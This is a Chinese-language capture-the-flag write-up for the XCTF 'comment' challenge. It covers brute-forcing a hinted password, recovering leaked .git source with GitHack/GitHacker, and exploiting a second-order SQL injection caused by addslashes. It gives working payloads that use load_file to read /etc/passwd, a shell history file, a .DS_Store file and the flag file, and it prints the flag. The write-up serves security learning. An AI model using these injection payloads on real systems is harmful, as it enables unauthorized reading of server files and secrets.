# comment

[题目地址](https://adworld.xctf.org.cn/challenges/details?hash=f840c66d-a402-4cba-a7db-e07f6f5cd5e3_2)

做不出来一道题只需要不知道一个知识点就好。

进到网站，是一个留言界面。写句话测试一下吧，提示要登录。登录框内容似乎在提示什么。

- zhangwei<br>zhangwei***

题目提示是sql，我就在这里用sqlmap测试了一会，没东西。不会用户名和密码就是提示的内容吧？尝试用户名zhangwei，密码zhangwei*\*\*，不行。只能说我太天真了，密码不是zhangwei***，这代表了最后3位要爆破。bp intruder直接冲，得到后面3位是666。大佬们提示这种情况一般末尾都是数字，所以先试数字会比较快。

然而登录了一点用都没有。哪有sql啊，登录框是最可能有sql的地方，但是没有。随便发了个帖测试一下，没东西。发帖处是剩下的可能性中最有可能的了，要是能知道源码就简单很多了。记得做之前的题提到git泄露源码，扫一下目录，发现真的有.git。拿出之前积累的脚本GitHack看看有啥。

- python3 GitHack.py http://61.147.171.105:61388/.git/

```php
<?php
include "mysql.php";
session_start();
if($_SESSION['login'] != 'yes'){
    header("Location: ./login.php");
    die();
}
if(isset($_GET['do'])){
switch ($_GET['do'])
{
case 'write':
    break;
case 'comment':
    break;
default:
    header("Location: ./index.php");
}
}
else{
    header("Location: ./index.php");
}
?>
```

你这源码有问题吧？不会了，看[wp](https://blog.csdn.net/hxhxhxhxx/article/details/107937982)。原来是要用更牛逼的git脚本[GitHacker](https://github.com/wangyihang/githacker)。跟着wp走，恢复了真正的源码。

```php
<?php
include "mysql.php";
session_start();
if($_SESSION['login'] != 'yes'){
    header("Location: ./login.php");
    die();
}
if(isset($_GET['do'])){
switch ($_GET['do'])
{
case 'write':
    $category = addslashes($_POST['category']);
    $title = addslashes($_POST['title']);
    $content = addslashes($_POST['content']);
    $sql = "insert into board
            set category = '$category',
                title = '$title',
                content = '$content'";
    $result = mysql_query($sql);
    header("Location: ./index.php");
    break;
case 'comment':
    $bo_id = addslashes($_POST['bo_id']);
    $sql = "select category from board where id='$bo_id'";
    $result = mysql_query($sql);
    $num = mysql_num_rows($result);
    if($num>0){
    $category = mysql_fetch_array($result)['category'];
    $content = addslashes($_POST['content']);
    $sql = "insert into comment
            set category = '$category',
                content = '$content',
                bo_id = '$bo_id'";
    $result = mysql_query($sql);
    }
    header("Location: ./comment.php?id=$bo_id");
    break;
default:
    header("Location: ./index.php");
}
}
else{
    header("Location: ./index.php");
}
?>
```

sql注入肯定要看sql语句。发现了二次注入标志：addslashes。addslashes会处理输入的数据，让插入时不会出现sql注入漏洞。可是这个addslashes有点掩耳盗铃的意思了，它只是让插入时没有漏洞，真正存到数据库里的数据仍然保持原样。意味着只要再读取数据的时候，之前的sql payload就会爆发。这里满足了两个条件：addslashes和后续读取。这种注入有个名字——二次注入。

二次注入肯定不能一次就把数据泄露出来。根据源码的write和comment分区，加上自己的实验，write在comment之前。所以我们要在write区埋下炸弹，comment区配合触发。write区对应发帖，comment区对应详情中的留言。先看comment区的，毕竟泄露的信息从这里出来。

```php
    $category = mysql_fetch_array($result)['category'];
    $content = addslashes($_POST['content']);
    $sql = "insert into comment
            set category = '$category',
                content = '$content',
                bo_id = '$bo_id'";
    $result = mysql_query($sql);
```

category是之前发帖时可以决定的，content在category的下面，且会显示。sql的思路之一不就是闭合吗，那闭合内容要在回显的上面。要在category处搞事情。这题不能使用常规的爆库爆字段什么的，要用sql自带的load_file读取文件。看看下面这个payload。

- ',content=(select( load_file('/etc/passwd'))),/*

这个放在发帖处的category栏。使用/*是因为下面comment的sql是多行，平时用的#是单行。其他的例如title，content随便填。然后点进详情，补上最后的导火线。

- */#

为什么这样可以呢？来看看现在的sql语句。

```php
    $sql = "insert into comment
            set category = '',content=(select( load_file('/etc/passwd'))),/*',
                content = '*/#',
                bo_id = '$bo_id'";
```

我们自己构造了content，同时用多行注释符将原本的content注释掉了，那显示的内容就是我们想要读取的内容了。看/etc/passwd是为了知道当前www用户用的是什么命令解释器，再读取命令的历史记录就能知道更多信息了。

- ',content=(select (load_file('/home/www/.bash_history'))),/*
- */#
  > cd /tmp/ unzip html.zip rm -f html.zip cp -r html /var/www/ cd /var/www/html/ rm -f .DS_Store service apache2 start

把.DS_Store删掉了。.DS_Store也是能泄露东西的好玩意，使用这个[脚本](https://github.com/gehaxelt/Python-dsstore/blob/master/main.py)来知道有什么藏起来的文件。读取一下。

- ', content=(select hex(load_file('/tmp/html/.DS_Store'))),/*
- */#

输出就不放了，太长了。用hex编码的原因是直接读取出不来，可能是有不可打印字符。用上面提到的脚本得知flag的名字为flag_8946e1ff1ee3e40f.php。最后一步了。

- ',content=(select hex(load_file('/var/www/html/flag_8946e1ff1ee3e40f.php'))),/*
- */#
  > 3C3F7068700A0924666C61673D22666C61677B30646431346161653831643934393034623334393231313765326133643464667D223B0A3F3E0A

hex解码得到flag。

- ### Flag
  > flag{0dd14aae81d94904b3492117e2a3d4df}